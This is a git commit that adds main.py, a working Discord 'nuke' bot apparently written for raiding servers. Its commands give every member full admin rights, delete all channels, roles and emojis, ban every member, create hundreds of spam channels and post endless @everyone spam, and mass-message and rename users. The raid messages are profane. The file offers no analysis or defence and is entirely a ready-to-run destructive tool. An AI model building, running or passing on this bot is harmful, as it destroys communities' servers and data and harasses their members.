7925dac828fc06620a2eac5225e5bb2828a46e9f
finns-123 <81494537+finns-123@users.noreply.github.com>
2021-08-07 18:29:05 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,137 @@
+import discord
+from discord.ext import commands
+import random
+from discord import Permissions
+from colorama import Fore, Style
+import asyncio
+
+
+token = "DISCORD BOT TOKEN"
+
+
+
+SPAM_CHANNEL =  ["FUCKING-RAIDED, BEAMED, NUKED, RAIDED, AHAHAH, LMFAO, AHAHAHAHAH, NUKED, RAIDED, SUB-TO-PR0XY-ON-YT, AHAHAH, FUCKED-UP, BEAMED, RAIDED, NUKED"]  
+SPAM_MESSAGE = ["@everyone, @everyone, :clown: RAIDED, NUKED, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, @everyone, RAIDED BY PR0XY!"]
+
+intents = discord.Intents(messages=True, guilds=True, members=True)
+
+client = commands.Bot(command_prefix='.n', intents=intents)
+
+
+@client.event
+async def on_ready():
+   print(''' Ready to nuke some servers!''')
+   await client.change_presence(activity=discord.Game(name="Vibin"))
+
+@client.command()
+@commands.is_owner()
+async def stop(ctx):
+    await ctx.bot.logout()
+    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
+
+@client.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    try:
+      role = discord.utils.get(guild.roles, name = "@everyone")
+      await role.edit(permissions = Permissions.all())
+      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
+    except:
+      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
+    for channel in guild.channels:
+      try:
+        await channel.delete()
+        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
+    for member in guild.members:
+     try:
+       await member.ban()
+       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+    for role in guild.roles:
+     try:
+       await role.delete()
+       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
+    for emoji in list(ctx.guild.emojis):
+     try:
+       await emoji.delete()
+       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
+    banned_users = await guild.bans()
+    for ban_entry in banned_users:
+      user = ban_entry.user
+      try:
+        await user.unban("Obama's Step Son#1557")
+        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
+    await guild.create_text_channel("Sub To Astrotrek")
+    for channel in guild.text_channels:
+        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        print(f"New Invite: {link}")
+    amount = 500
+    for i in range(amount):
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+    print(f"Nuked {guild.name} Successfully.")
+    return
+
+@client.command(pass_context=True)
+async def Rename(ctx, rename_to):
+    await ctx.message.delete()
+    for member in list(client.get_all_members()):
+        try:
+            await member.edit(nick=rename_to)
+            print (f"{member.name} has been renamed to {rename_to}")
+        except:
+            print (f"{member.name} has NOT been renamed")
+        print("Action completed: Rename all")
+
+@client.command(pass_context=True)
+async def Message(ctx):
+    await ctx.message.delete()
+    for member in list(client.get_all_members()):
+        await asyncio.sleep(0)
+        try:
+            embed = discord.Embed(title="raided", description="raided" , color=discord.Colour.purple())
+            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
+            embed.set_footer(text="Sub To pr0xy")
+            await asyncio.sleep(3) # This is a delay on the command so the bot doesn't get rate limited, if you remove this the bot might get banned or rate limited
+            await member.send(embed=embed)
+        except:
+            pass
+        print("Action completed: Message all")
+        
+
+@client.command(pass_context=True)
+async def emoji(ctx):
+      for emoji in list(ctx.guild.emojis):
+        try:
+            await emoji.delete()
+            print (f"{emoji.name} has been deleted")
+        except:
+            pass   
+
+@client.command(pass_context=True)
+async def role(ctx):
+  for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+            print (f"{role.name} has been deleted")
+        except:
+            pass          
+
+
+
+
+@client.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(SPAM_MESSAGE))
+
+client.run(token, bot=True)
